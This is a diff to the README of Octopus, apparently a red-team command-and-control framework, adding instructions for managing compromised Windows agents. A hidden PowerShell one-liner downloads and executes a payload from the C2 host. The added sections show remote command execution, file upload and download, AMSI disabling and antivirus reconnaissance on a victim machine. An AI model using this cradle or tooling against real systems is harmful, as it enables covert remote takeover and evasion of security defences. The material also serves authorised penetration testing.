@@ -34,7 +34,7 @@ Octopus has been tested on the following operating systems:
 
 * Ubuntu (18.04)
 * Ubuntu (16.04)
-* Kali Linux (2019.2) (No need for install requirements.txt)
+* Kali Linux (2019.2) (No need to install requirements.txt)
 
 If you have any troubles using Octopus, feel free to open an [issue](https://github.com/mhaskar/Octopus/issues) !
 
@@ -174,12 +174,146 @@ and we will get the following results:
 Octopus >>generate_powershell operation1
 
 powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"
-
 ```
 
 Now we can use this oneliner to start our agent.
 
 ### Interacting with agents
 
+first of all you can list all the connected agents using `list` command to get the following results:
+```
+Octopus >>list
+
+
+  Session  IP            Hostname       PID  Username       Domain        Last ping                 OS
+---------  ------------  -----------  -----  -------------  ------------  ------------------------  --------------------------------
+        1  192.168.1.43  HR-PC-TYRMJ  10056  hr-pc\labuser  darkside.com  Tue Sep  3 10:22:07 2019  Microsoft Windows 10 Pro(64-bit)
+
+
+Octopus >>
+
+```
+
+And then we can use `interact` command to interact with the host like the following:
+
+```
+Octopus >>list
+
+
+  Session  IP            Hostname       PID  Username       Domain        Last ping                 OS
+---------  ------------  -----------  -----  -------------  ------------  ------------------------  --------------------------------
+        1  192.168.1.43  HR-PC-TYRMJ  10056  hr-pc\labuser  darkside.com  Tue Sep  3 10:22:07 2019  Microsoft Windows 10 Pro(64-bit)
+
+
+Octopus >>interact 1
+(HR-PC-TYRMJ) >>
+
+```
+
+And you can list all the available commands to use using `help` command like the following:
+
+```
+Octopus >>list
+
+
+  Session  IP            Hostname       PID  Username       Domain        Last ping                 OS
+---------  ------------  -----------  -----  -------------  ------------  ------------------------  --------------------------------
+        1  192.168.1.43  HR-PC-TYRMJ  10056  hr-pc\labuser  darkside.com  Tue Sep  3 10:22:07 2019  Microsoft Windows 10 Pro(64-bit)
+
+
+Octopus >>interact 1
+(HR-PC-TYRMJ) >> help
+
+
+Available commands to use :
+
+Hint : if you want to execute system command just type it and wait for the results
+
++++++++++
+help  				show this help menu
+exit/back 			exit current session and back to the main screen
+clear 				clear the screen output
+upload 				upload file to the target machine
+download 			download file from the target machine
+load 				load powershell module to the target machine
+disable_amsi 		disable AMSI on the target machine
+report 				get situation report from the target
+
+
+(HR-PC-TYRMJ) >>
+
+```
+
+and to execute a system command directly we can type the command directly and then wait for the results based on the interval check time that we set when we created the listener.
+
+```
+(HR-PC-TYRMJ) >> ipconfig
+[+] Command sent , waiting for results
+(HR-PC-TYRMJ) >>
+Command execution result is :
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet1:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : home
+   Link-local IPv6 Address . . . . . : fe80::f85f:d52b:1d8d:cbae%10
+   IPv4 Address. . . . . . . . . . . : 192.168.1.43
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.1.1
+
+Ethernet adapter Ethernet:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+
+Ethernet adapter Bluetooth Network Connection:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+
+
+
+(HR-PC-TYRMJ) >>
+```
+
+In this case the command has been encrypted and then sent to the agent, after that the client will decrypt the command and execute it, then the agent will encrypt the results and send it back again to the C2 to decrypt it and show the results.
+
+Also we can use `report` command to get the ESA information like the following:
+
+```
+(HR-PC-TYRMJ) >> report
+[+] Command sent , waiting for results
+(HR-PC-TYRMJ) >>
+Endpoint situation awareness report for HR-PC-TYRMJ
+
+=============
+Hostname : 	HR-PC-TYRMJ
+Domain : 	darkside.com
+OS : 		Microsoft Windows 10 Pro(64-bit)
+OS build : 	10.0.17134
+OS arch : 	64-bit
+AntiVirus : Symantec
+SIEM solution : False
+
+(HR-PC-TYRMJ) >>
+```
+
 
 # Screenshots
+
+![Octopus main screen](screenshots/1.png)
+![Octopus Help](screenshots/2.png)
+![Octopus Listeners](screenshots/3.png)
+![Octopus over ssl](screenshots/4.png)
+![Octopus load module](screenshots/5.png)
+![Octopus ESA](screenshots/6.png)
+![Octopus ESA](screenshots/7.png)
+![Octopus agents](screenshots/8.png)
+![Octopus generate powershell](screenshots/9.png)
